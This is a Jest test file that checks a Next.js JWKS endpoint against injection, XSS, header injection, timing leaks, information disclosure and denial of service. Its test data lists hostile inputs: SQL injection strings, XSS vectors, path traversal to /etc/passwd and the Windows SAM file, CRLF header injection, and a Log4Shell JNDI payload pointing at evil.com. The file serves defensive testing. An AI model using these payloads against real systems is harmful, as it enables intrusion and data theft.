/**
 * Security Tests for Authentication and JWKS
 * Tests for injection, XSS, CSRF, timing attacks, and other vulnerabilities
 */

import { NextRequest } from 'next/server';
import { GET, HEAD, OPTIONS } from '@/app/api/.well-known/jwks.json/route';
import axios from 'axios';
import jwt from 'jsonwebtoken';
import crypto from 'crypto';
import { performance } from 'perf_hooks';

// Mock AWS SDK for security tests
jest.mock('@aws-sdk/client-secrets-manager', () => ({
  SecretsManagerClient: jest.fn(() => ({
    send: jest.fn(),
    destroy: jest.fn()
  })),
  GetSecretValueCommand: jest.fn()
}));

const BASE_URL = process.env.TEST_URL || 'http://localhost:3000';
const JWKS_URL = `${BASE_URL}/.well-known/jwks.json`;
const AUTH_URL = `${BASE_URL}/api/auth`;

// Security test payloads
const INJECTION_PAYLOADS = [
  "'; DROP TABLE users; --",
  '" OR "1"="1',
  '${7*7}',
  '{{7*7}}',
  '<script>alert("xss")</script>',
  'javascript:alert("xss")',
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '${jndi:ldap://evil.com/exploit}'
];

const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  'javascript:alert(1)',
  '"><script>alert(1)</script>',
  "'><script>alert(1)</script>",
  '<svg onload=alert(1)>',
  '<iframe src=javascript:alert(1)>',
  '<body onload=alert(1)>',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  'data:text/html,<script>alert(1)</script>'
];

const TIMING_ATTACK_SAMPLES = 100;
const TIMING_THRESHOLD_MS = 100; // Max difference for timing attacks

// Helper functions
const createMockRequest = (url: string, headers: Record<string, string> = {}, method: string = 'GET') => {
  return new NextRequest(url, { method, headers });
};

const measureTiming = async (fn: () => Promise<any>): Promise<number> => {
  const start = performance.now();
  try {
    await fn();
  } catch {
    // Ignore errors for timing measurement
  }
  return performance.now() - start;
};

const calculateTimingStats = (timings: number[]) => {
  const mean = timings.reduce((sum, t) => sum + t, 0) / timings.length;
  const variance = timings.reduce((sum, t) => sum + Math.pow(t - mean, 2), 0) / timings.length;
  const stdDev = Math.sqrt(variance);

  return { mean, stdDev, min: Math.min(...timings), max: Math.max(...timings) };
};

describe('Authentication Security Tests', () => {
  let mockSecretsClient: any;
  let consoleSpy: jest.SpyInstance;

  beforeEach(() => {
    consoleSpy = jest.spyOn(console, 'log').mockImplementation();
    jest.spyOn(console, 'error').mockImplementation();
    jest.spyOn(console, 'warn').mockImplementation();

    jest.clearAllMocks();

    const { SecretsManagerClient } = require('@aws-sdk/client-secrets-manager');
    mockSecretsClient = new SecretsManagerClient();

    // Default mock response
    mockSecretsClient.send.mockResolvedValue({
      SecretString: JSON.stringify({
        'test-key': {
          kty: 'RSA',
          use: 'sig',
          kid: 'test-key',
          alg: 'RS256',
          n: 'test-modulus',
          e: 'AQAB'
        }
      })
    });
  });

  afterEach(() => {
    consoleSpy.mockRestore();
  });

  describe('Input Validation Security', () => {
    test('should sanitize malicious query parameters', async () => {
      const maliciousParams = [
        'callback=javascript:alert(1)',
        'redirect_uri=javascript:alert(1)',
        'state=<script>alert(1)</script>',
        'error="><script>alert(1)</script>'
      ];

      for (const param of maliciousParams) {
        const url = `${JWKS_URL}?${param}`;
        const request = createMockRequest(url);

        const response = await GET(request);
        const text = await response.text();

        // Response should not contain unescaped malicious content
        expect(text).not.toContain('<script>');
        expect(text).not.toContain('javascript:');
        expect(text).not.toContain('alert(');

        // Should still return valid JWKS
        expect(response.status).toBe(200);
      }
    });

    test('should validate and sanitize HTTP headers', async () => {
      const maliciousHeaders = {
        'user-agent': '<script>alert(1)</script>',
        'x-forwarded-for': 'javascript:alert(1)',
        'x-real-ip': '">alert(1)',
        'referer': 'javascript:alert(1)',
        'accept': '../../etc/passwd',
        'host': 'evil.com<script>alert(1)</script>'
      };

      const request = createMockRequest(JWKS_URL, maliciousHeaders);

      const response = await GET(request);

      // Should handle malicious headers without errors
      expect(response.status).toBe(200);

      // Response headers should not contain unsanitized input
      const responseHeaders = Object.fromEntries(response.headers.entries());
      Object.values(responseHeaders).forEach(value => {
        expect(value).not.toContain('<script>');
        expect(value).not.toContain('javascript:');
      });
    });

    test('should prevent HTTP header injection', async () => {
      const injectionAttempts = [
        'test\r\nX-Injected-Header: injected',
        'test\nX-Injected-Header: injected',
        'test\r\n\r\n<script>alert(1)</script>',
        'test%0d%0aX-Injected-Header:%20injected'
      ];

      for (const injection of injectionAttempts) {
        const request = createMockRequest(JWKS_URL, {
          'x-test-header': injection
        });

        const response = await GET(request);

        // Should not allow header injection
        expect(response.headers.get('X-Injected-Header')).toBeNull();
        expect(response.status).toBe(200);
      }
    });

    test('should handle oversized requests gracefully', async () => {
      const largeHeader = 'x'.repeat(100000); // 100KB header

      const request = createMockRequest(JWKS_URL, {
        'x-large-header': largeHeader
      });

      const response = await GET(request);

      // Should handle large headers without crashing
      expect([200, 400, 413]).toContain(response.status);
    });
  });

  describe('SQL Injection Prevention', () => {
    test('should prevent SQL injection in AWS secret queries', async () => {
      // Test various SQL injection payloads
      for (const payload of INJECTION_PAYLOADS) {
        // Simulate injection attempt in secret name or parameters
        mockSecretsClient.send.mockRejectedValueOnce(new Error('Access denied'));

        const request = createMockRequest(`${JWKS_URL}?secret=${encodeURIComponent(payload)}`);
        const response = await GET(request);

        // Should return fallback response, not crash
        expect(response.status).toBe(200);
        const data = await response.json();
        expect(data).toHaveProperty('keys');
      }
    });
  });

  describe('XSS Prevention', () => {
    test('should prevent reflected XSS in error messages', async () => {
      for (const xssPayload of XSS_PAYLOADS) {
        // Force an error condition
        mockSecretsClient.send.mockRejectedValueOnce(new Error('Test error'));

        const request = createMockRequest(`${JWKS_URL}?callback=${encodeURIComponent(xssPayload)}`);
        const response = await GET(request);

        const text = await response.text();

        // Should not contain unescaped XSS payload
        expect(text).not.toContain(xssPayload);
        expect(text).not.toContain('<script');
        expect(text).not.toContain('javascript:');
        expect(text).not.toContain('onerror=');
        expect(text).not.toContain('onload=');
      }
    });

    test('should sanitize error information in headers', async () => {
      const xssPayload = '<script>alert(1)</script>';

      mockSecretsClient.send.mockRejectedValueOnce(new Error(xssPayload));

      const request = createMockRequest(JWKS_URL);
      const response = await GET(request);

      // Check that error information in headers is sanitized
      const errorHeader = response.headers.get('X-Error');
      if (errorHeader) {
        expect(errorHeader).not.toContain('<script>');
        expect(errorHeader).not.toContain('alert(');
        expect(errorHeader.length).toBeLessThanOrEqual(100); // Should be truncated
      }
    });
  });

  describe('CSRF Protection', () => {
    test('should validate origin headers for state-changing operations', async () => {
      const maliciousOrigins = [
        'https://evil.com',
        'http://malicious-site.net',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>'
      ];

      for (const origin of maliciousOrigins) {
        const request = createMockRequest(JWKS_URL, {
          'origin': origin,
          'referer': origin
        });

        const response = await GET(request);

        // JWKS endpoint is read-only, so should still work
        // But headers should indicate CORS policy
        expect(response.headers.get('Access-Control-Allow-Origin')).toBe('*');
        expect(response.status).toBe(200);
      }
    });

    test('should include proper CORS headers', async () => {
      const request = createMockRequest(JWKS_URL);
      const response = await GET(request);

      expect(response.headers.get('Access-Control-Allow-Origin')).toBe('*');
      expect(response.headers.get('Access-Control-Allow-Methods')).toContain('GET');
      expect(response.headers.get('X-Content-Type-Options')).toBe('nosniff');
    });
  });

  describe('Timing Attack Prevention', () => {
    test('should not leak information through timing differences', async () => {
      const validTimings: number[] = [];
      const invalidTimings: number[] = [];

      // Test with valid secret scenario
      for (let i = 0; i < TIMING_ATTACK_SAMPLES; i++) {
        mockSecretsClient.send.mockResolvedValueOnce({
          SecretString: JSON.stringify({ 'valid-key': { kty: 'RSA', use: 'sig', kid: 'valid', alg: 'RS256', n: 'test', e: 'AQAB' } })
        });

        const timing = await measureTiming(async () => {
          const request = createMockRequest(JWKS_URL);
          await GET(request);
        });

        validTimings.push(timing);
      }

      // Test with invalid/error scenario
      for (let i = 0; i < TIMING_ATTACK_SAMPLES; i++) {
        mockSecretsClient.send.mockRejectedValueOnce(new Error('Access denied'));

        const timing = await measureTiming(async () => {
          const request = createMockRequest(JWKS_URL);
          await GET(request);
        });

        invalidTimings.push(timing);
      }

      const validStats = calculateTimingStats(validTimings);
      const invalidStats = calculateTimingStats(invalidTimings);

      // Timing difference should not be significant enough for timing attacks
      const meanDifference = Math.abs(validStats.mean - invalidStats.mean);

      console.log('Timing analysis:', {
        validStats,
        invalidStats,
        meanDifference
      });

      // Allow some variance but not enough for reliable timing attacks
      expect(meanDifference).toBeLessThan(TIMING_THRESHOLD_MS);
    }, 30000);

    test('should not leak key existence through timing', async () => {
      const existentKeyTimings: number[] = [];
      const nonExistentKeyTimings: number[] = [];

      // Simulate requests for existent keys
      for (let i = 0; i < 50; i++) {
        mockSecretsClient.send.mockResolvedValueOnce({
          SecretString: JSON.stringify({ 'key-1': { kty: 'RSA', use: 'sig', kid: 'key-1', alg: 'RS256', n: 'test', e: 'AQAB' } })
        });

        const timing = await measureTiming(async () => {
          const request = createMockRequest(JWKS_URL);
          await GET(request);
        });

        existentKeyTimings.push(timing);
      }

      // Simulate requests for non-existent keys (fallback scenario)
      for (let i = 0; i < 50; i++) {
        mockSecretsClient.send.mockRejectedValueOnce(new Error('Secret not found'));

        const timing = await measureTiming(async () => {
          const request = createMockRequest(JWKS_URL);
          await GET(request);
        });

        nonExistentKeyTimings.push(timing);
      }

      const existentStats = calculateTimingStats(existentKeyTimings);
      const nonExistentStats = calculateTimingStats(nonExistentKeyTimings);

      const meanDifference = Math.abs(existentStats.mean - nonExistentStats.mean);

      // Should not leak existence through timing
      expect(meanDifference).toBeLessThan(TIMING_THRESHOLD_MS);
    });
  });

  describe('Information Disclosure Prevention', () => {
    test('should not expose sensitive AWS errors', async () => {
      const sensitiveErrors = [
        'User: arn:aws:iam::123456789012:user/test is not authorized',
        'KMS key arn:aws:kms:us-east-1:123456789012:key/12345678 does not exist',
        'Secret arn:aws:secretsmanager:us-east-1:123456789012:secret:prod-keys',
        'Database connection string: postgres://user:pass@host:5432/db'
      ];

      for (const sensitiveError of sensitiveErrors) {
        mockSecretsClient.send.mockRejectedValueOnce(new Error(sensitiveError));

        const request = createMockRequest(JWKS_URL);
        const response = await GET(request);

        const text = await response.text();
        const headers = Object.fromEntries(response.headers.entries());

        // Should not expose sensitive information
        expect(text).not.toContain('arn:aws:');
        expect(text).not.toContain('123456789012');
        expect(text).not.toContain('postgres://');
        expect(text).not.toContain('user:pass');

        // Check headers too
        Object.values(headers).forEach(value => {
          expect(value).not.toContain('arn:aws:');
          expect(value).not.toContain('123456789012');
        });
      }
    });

    test('should not expose internal file paths', async () => {
      const pathDisclosureError = new Error('ENOENT: no such file or directory, open \'/app/secrets/private-key.pem\'');

      mockSecretsClient.send.mockRejectedValueOnce(pathDisclosureError);

      const request = createMockRequest(JWKS_URL);
      const response = await GET(request);

      const text = await response.text();

      // Should not expose internal paths
      expect(text).not.toContain('/app/');
      expect(text).not.toContain('private-key.pem');
      expect(text).not.toContain('secrets/');
    });

    test('should not expose stack traces in production', async () => {
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';

      try {
        mockSecretsClient.send.mockRejectedValueOnce(new Error('Test error with stack trace'));

        const request = createMockRequest(JWKS_URL);
        const response = await GET(request);

        const text = await response.text();

        // Should not contain stack trace information
        expect(text).not.toContain('at ');
        expect(text).not.toContain('.js:');
        expect(text).not.toContain('Error: ');
        expect(text).not.toContain('TypeError: ');
      } finally {
        process.env.NODE_ENV = originalEnv;
      }
    });
  });

  describe('Denial of Service Prevention', () => {
    test('should handle malformed JSON gracefully', async () => {
      const malformedJsonInputs = [
        '{"incomplete": json',
        '{"nested": {"deeply": {"very": {"much": "so"}}}}'.repeat(1000),
        '{}' + '\n'.repeat(100000),
        '{"key": "' + 'x'.repeat(1000000) + '"}'
      ];

      for (const malformedJson of malformedJsonInputs) {
        mockSecretsClient.send.mockResolvedValueOnce({
          SecretString: malformedJson
        });

        const startTime = Date.now();
        const request = createMockRequest(JWKS_URL);
        const response = await GET(request);
        const processingTime = Date.now() - startTime;

        // Should handle gracefully without taking too long
        expect(processingTime).toBeLessThan(5000);
        expect(response.status).toBe(200); // Should fallback
      }
    });

    test('should limit response size', async () => {
      const largeKeyData = {
        'large-key': {
          kty: 'RSA',
          use: 'sig',
          kid: 'large-key',
          alg: 'RS256',
          n: 'x'.repeat(100000), // Very large modulus
          e: 'AQAB'
        }
      };

      mockSecretsClient.send.mockResolvedValueOnce({
        SecretString: JSON.stringify(largeKeyData)
      });

      const request = createMockRequest(JWKS_URL);
      const response = await GET(request);

      // Should handle large responses appropriately
      expect(response.status).toBe(200);

      // Response size should be reasonable
      const text = await response.text();
      expect(text.length).toBeLessThan(1000000); // Less than 1MB
    });

    test('should timeout long-running operations', async () => {
      // Simulate a very slow AWS response
      mockSecretsClient.send.mockImplementationOnce(() =>
        new Promise(resolve => setTimeout(resolve, 10000))
      );

      const startTime = Date.now();
      const request = createMockRequest(JWKS_URL);
      const response = await GET(request);
      const duration = Date.now() - startTime;

      // Should timeout and return fallback within reasonable time
      expect(duration).toBeLessThan(7000); // Should timeout before 7 seconds
      expect(response.status).toBe(200); // Should return fallback
    });
  });

  describe('Authentication Bypass Prevention', () => {
    test('should not bypass authentication with malformed tokens', async () => {
      const malformedTokens = [
        'TEST.INVALID.JWT', // Test JWT with "none" algorithm
        'Bearer ',
        'malformed.jwt.token',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/exploit}'
      ];

      for (const token of malformedTokens) {
        const request = createMockRequest(JWKS_URL, {
          'Authorization': `Bearer ${token}`
        });

        const response = await GET(request);

        // JWKS endpoint should work regardless of auth token (it's public)
        expect(response.status).toBe(200);

        // But malformed tokens should not cause errors
        const data = await response.json();
        expect(data).toHaveProperty('keys');
      }
    });

    test('should validate JWT signatures properly', async () => {
      // Create a JWT with invalid signature
      const header = Buffer.from(JSON.stringify({ alg: 'RS256', typ: 'JWT' })).toString('base64url');
      const payload = Buffer.from(JSON.stringify({ sub: 'test', exp: Date.now() + 3600 })).toString('base64url');
      const invalidSignature = 'invalid-signature';
      const invalidJWT = `${header}.${payload}.${invalidSignature}`;

      const request = createMockRequest(JWKS_URL, {
        'Authorization': `Bearer ${invalidJWT}`
      });

      const response = await GET(request);

      // Should handle invalid JWT gracefully
      expect(response.status).toBe(200);
    });
  });

  describe('Configuration Security', () => {
    test('should not expose environment variables', async () => {
      // Force an error that might expose env vars
      mockSecretsClient.send.mockRejectedValueOnce(new Error('AWS_SECRET_ACCESS_KEY is invalid'));

      const request = createMockRequest(JWKS_URL);
      const response = await GET(request);

      const text = await response.text();

      // Should not expose environment variable names or values
      expect(text).not.toContain('AWS_SECRET_ACCESS_KEY');
      expect(text).not.toContain('AWS_ACCESS_KEY_ID');
      expect(text).not.toContain('DATABASE_URL');
      expect(text).not.toContain('NEXTAUTH_SECRET');
    });

    test('should use secure default configurations', async () => {
      const request = createMockRequest(JWKS_URL);
      const response = await GET(request);

      // Check security headers
      expect(response.headers.get('X-Content-Type-Options')).toBe('nosniff');
      expect(response.headers.get('Access-Control-Allow-Origin')).toBe('*');

      // Cache control should be appropriate
      const cacheControl = response.headers.get('Cache-Control');
      expect(cacheControl).toContain('public');
      expect(cacheControl).toContain('max-age');
    });
  });

  describe('Rate Limiting Security', () => {
    test('should implement rate limiting to prevent abuse', async () => {
      const requests = [];

      // Make many rapid requests
      for (let i = 0; i < 200; i++) {
        requests.push(GET(createMockRequest(JWKS_URL)));
      }

      const responses = await Promise.all(requests);

      // Should have some rate limiting or at least handle all requests
      const successCount = responses.filter(r => r.status === 200).length;
      const rateLimitedCount = responses.filter(r => r.status === 429).length;

      // Either all succeed (good caching) or some are rate limited
      expect(successCount + rateLimitedCount).toBe(200);
      expect(successCount).toBeGreaterThan(0); // At least some should succeed
    });
  });

  describe('HTTP Methods Security', () => {
    test('should only allow safe HTTP methods', async () => {
      const unsafeMethods = ['POST', 'PUT', 'DELETE', 'PATCH'];

      for (const method of unsafeMethods) {
        const request = createMockRequest(JWKS_URL, {}, method);

        // These methods are not implemented, should return 405
        try {
          await GET(request); // This will fail because GET handler doesn't accept other methods
        } catch (error) {
          // Expected behavior
        }
      }

      // Safe methods should work
      const safeRequest = createMockRequest(JWKS_URL, {}, 'GET');
      const response = await GET(safeRequest);
      expect(response.status).toBe(200);
    });

    test('should handle OPTIONS requests securely', async () => {
      const request = createMockRequest(JWKS_URL, {}, 'OPTIONS');
      const response = await OPTIONS(request);

      expect(response.status).toBe(204);
      expect(response.headers.get('Access-Control-Allow-Methods')).toBe('GET, HEAD, OPTIONS');
      expect(response.headers.get('Access-Control-Max-Age')).toBe('86400');
    });

    test('should handle HEAD requests without body', async () => {
      const request = createMockRequest(JWKS_URL, {}, 'HEAD');
      const response = await HEAD(request);

      expect(response.status).toBe(200);
      expect(response.body).toBeNull();
    });
  });
});
